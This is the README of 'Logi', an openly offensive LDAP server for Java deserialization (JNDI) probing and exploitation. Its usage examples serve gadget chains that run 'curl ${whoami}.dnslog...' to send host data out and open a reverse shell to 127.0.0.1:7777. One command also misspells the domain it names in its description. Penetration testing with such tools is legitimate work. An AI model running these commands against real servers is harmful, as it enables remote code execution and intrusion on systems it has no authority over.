# LOGI
Logi is a ldap server focusing on ldap deserialize recon and exploit.



## Get started
Download logi from release.
Use `-h` to show help.
```
$ ./logi -h
Logi is a ldap server focusing on ldap deserialize recon and exploit.

Usage:
  ./logi [flags]

Flags:
MODE CONFIG:
   -m, -mode int  1 for poc, 2 for probe, 3 for exploit

SERVE CONFIG:
   -i, -ip string    ip for binding (default "0.0.0.0")
   -p, -port string  port for binding (default "1389")

PROBE CONFIG:
   -d, -domain string     domain for dns lookup
   -w, -dictname string   wordlist name for probe, support: yso, jndi, mvn (default "yso")
   -wp, -dictpath string  wordlist path for probe

EXPLOIT CONFIG:
   -g, -gadget string   gadget for exploit, support: cb1v18, cb1v19
   -c, -command string  command for exploit
   -s, -shell string    reverse shell, e.g. 127.0.0.1:7777
```

## How it work
Logi hosts a ldap service, waiting for ldap lookup
- poc mode: reply a urldns gadget points to `domain` for deserialize 
- probe mode: reply different probe gadgets points to `probename.domain` in turn for dependency probe
- exploit mode: reply a gadget for command execute

## Examples
Run poc mode with dns domain `dnslog.me`.
You need to send a ldap lookup to logi.
```
./logi -m 1 -d dnslog.me
```
Run probe mode with dns domain `dnslog.me` with embed wordlist `yso`.
You need to request many times to traverse the wordlist.
```
./logi -m 2 -d dnslog.me -w yso
```
Run probe mode with dns domain `dnslog.me` with custom wordlist in `./dict.txt`.
One class name per line.
```
./logi -m 2 -d dnslog.me -wp ./dict.txt
```
Run exploit mode with gadget `cb1v18`  with command `curl ${whoami}.dnslog.me`
```
./logi -m 3 -g cb1v18 -c 'curl ${whoami}.dnslog.i'
```
Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
```
./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
```
## See also
https://github.com/BishopFox/GadgetProbe\
https://github.com/exp1orer/JNDI-Inject-Exploit